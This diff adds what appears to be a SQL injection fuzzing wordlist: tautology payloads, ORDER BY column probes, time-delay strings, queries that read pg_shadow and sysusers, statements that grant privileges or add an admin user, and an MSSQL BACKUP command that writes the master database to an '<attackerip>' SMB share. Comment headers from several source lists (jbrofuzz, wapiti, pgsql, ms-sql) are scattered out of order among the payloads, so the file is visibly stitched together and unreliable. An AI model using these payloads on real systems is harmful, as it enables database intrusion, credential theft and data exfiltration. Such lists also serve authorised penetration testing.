@@ -1,0 +1,242 @@
+1-true
+||		(double pipe) concatenate
+\
+1
+ ORDER BY 25 
+ ORDER BY 15 
+ ORDER BY 5 
+ ORDER BY 26# 
+ ORDER BY 16# 
+ ORDER BY 6# 
+ ORDER BY 27-- 
+ ORDER BY 17-- 
+ ORDER BY 7-- 
+ WHERE 1=1 AND 1=1#
+ AND 1=1#
+ HAVING 1=1
+ OR 1=1#
+select session_user;
+select * from sysusers
+or 1=1/*
+`	    Backtick
+Finding the table name
+1' GROUP BY 1,2,--+
+AND false
+/*…*/ 
+/
+ ORDER BY 23 
+ ORDER BY 13 
+ ORDER BY 3 
+ ORDER BY 24# 
+ ORDER BY 14# 
+ ORDER BY 4# 
+ ORDER BY 25-- 
+ ORDER BY 15-- 
+ ORDER BY 5-- 
+ WHERE 1=1 AND 1=1
+ AND 7300=7300 AND 'pKlZ'='pKlZ
+ AND 1=1-- 
+ OR x=x
+# mysql local file disclosure through sqli
+1 exec sp_ (or exec xp_)
+select @@microsoftversione
+ or 1=1–
+ or 1=1
+' #
+or 1=1--
+Comments:
+@@variable	global variable
+ OR 1=1
+' or "
+`
+'\"
+[1]
+ ORDER BY 28 
+ ORDER BY 18 
+ ORDER BY 8 
+ ORDER BY 29# 
+ ORDER BY 19# 
+ ORDER BY 9# 
+ ORDER BY 30-- 
+ ORDER BY 20-- 
+ ORDER BY 10-- 
+ WHERE 1=1 AND 1=0--
+ AS INJECTX WHERE 1=1 AND 1=0
+ AND 1=0 AND '%'='
+ HAVING 1=0#
+ OR x=y#
+create table myfile (input TEXT);
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+' grant connect to name; grant resource to name; --
+ or 0=0 --
+admin" #
+',NULL)%20waifor%20delay%20'0:0:20'%20/*
+/*  	C-style comment
+AND 1
+,
+1\
+ ORDER BY 30 
+ ORDER BY 20 
+ ORDER BY 10 
+ ORDER BY 31337#
+ ORDER BY 21# 
+ ORDER BY 11# 
+ ORDER BY 1# 
+ ORDER BY 22-- 
+ ORDER BY 12-- 
+ ORDER BY 2-- 
+ AS INJECTX WHERE 1=1 AND 1=0#
+ AND 7506=9091 AND (5913=5913
+ HAVING 1=0-- 
+ OR 1=0-- 
+' || myappadmin.adduser('admin', 'newpass') || '
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+# might need to terminate payloads with ;--
+# you will need to customize/modify some of the values in the queries for best effect
+) or ('1′='1–
+ or 1=1--
+ or 0=0 –
+ and 1=1
+=
+-- -	SQL comment
+AND 0
+"
+ ORDER BY 31337 
+ ORDER BY 21 
+ ORDER BY 11 
+ ORDER BY 1 
+ ORDER BY 22# 
+ ORDER BY 12# 
+ ORDER BY 2# 
+ ORDER BY 23-- 
+ ORDER BY 13-- 
+ ORDER BY 3-- 
+ AS INJECTX WHERE 1=1 AND 1=1--
+ AND 1083=1083 AND ('1427=1427
+ AND 1=1
+ OR x=x-- 
+ OR 1=1
+# info disclosure payload fuzzfile for pgsql
+select @@version
+ or 1=1/*
+ and 1=1–
+'
+or true--
+'),NULL)%20waifor%20delay%20'0:0:20'%20/*
+1*56
+%		wildcard attribute indicator
+\\
+'
+1'
+ ORDER BY 26 
+ ORDER BY 16 
+ ORDER BY 6 
+ ORDER BY 27# 
+ ORDER BY 17# 
+ ORDER BY 7# 
+ ORDER BY 28-- 
+ ORDER BY 18-- 
+ ORDER BY 8-- 
+ WHERE 1=1 AND 1=0#
+ AND 1=0#
+ HAVING 1=0
+ OR 1=0#
+select * from pg_shadow;
+# contains statements from jbrofuzz
+AND true
+""
+ ORDER BY 22 
+ ORDER BY 12 
+ ORDER BY 2 
+ ORDER BY 23# 
+ ORDER BY 13# 
+ ORDER BY 3# 
+ ORDER BY 24-- 
+ ORDER BY 14-- 
+ ORDER BY 4-- 
+ AS INJECTX WHERE 1=1 AND 1=0--
+ AND 7506=9091 AND ('5913=5913
+ AND 1=0
+ OR x=y-- 
+ OR 1=0
+1'1
+select @@servernamee
+ or 1=1#
+or 1=1
+" "
+' '
+Time-Based:
+1-false
++		addition, concatenate (or space in url)
+//
+ ORDER BY 24 
+ ORDER BY 14 
+ ORDER BY 4 
+ ORDER BY 25# 
+ ORDER BY 15# 
+ ORDER BY 5# 
+ ORDER BY 26-- 
+ ORDER BY 16-- 
+ ORDER BY 6-- 
+ WHERE 1=1 AND 1=0
+ AND 7300=7300 AND 'pKlZ'='pKlY
+ AND 1=0-- 
+ OR x=y
+select current_user;
+# fuzz interesting absolute filepath/filename into <filepath>
+select * from master..sysserverse
+ or true
+' –
+or 1=1#
+#	    Hash comment
+# Numeric
+-- or # 
+``
+1`
+ ORDER BY 29 
+ ORDER BY 19 
+ ORDER BY 9 
+ ORDER BY 30#
+ ORDER BY 20# 
+ ORDER BY 10# 
+ ORDER BY 31337-- 
+ ORDER BY 21-- 
+ ORDER BY 11-- 
+ ORDER BY 1-- 
+ AS INJECTX WHERE 1=1 AND 1=1#
+ AND 1083=1083 AND (1427=1427
+ HAVING 1=1-- 
+ OR 1=1-- 
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+'="or'
+) or '1′='1–
+ or 1=1
+ or 0=0 #
+" #
+==
+-2
+@variable	local variable
+;
+''
+# from wapiti
+1"
+ ORDER BY 27 
+ ORDER BY 17 
+ ORDER BY 7 
+ ORDER BY 28# 
+ ORDER BY 18# 
+ ORDER BY 8# 
+ ORDER BY 29-- 
+ ORDER BY 19-- 
+ ORDER BY 9-- 
+ WHERE 1=1 AND 1=1--
+ AS INJECTX WHERE 1=1 AND 1=1
+ AND 1=1 AND '%'='
+ HAVING 1=1#
+ OR x=x#
+select * from pg_group;
+# ms-sqli info disclosure payload fuzzfile
+'#
+admin' #
+" or "" "
+' or '' '
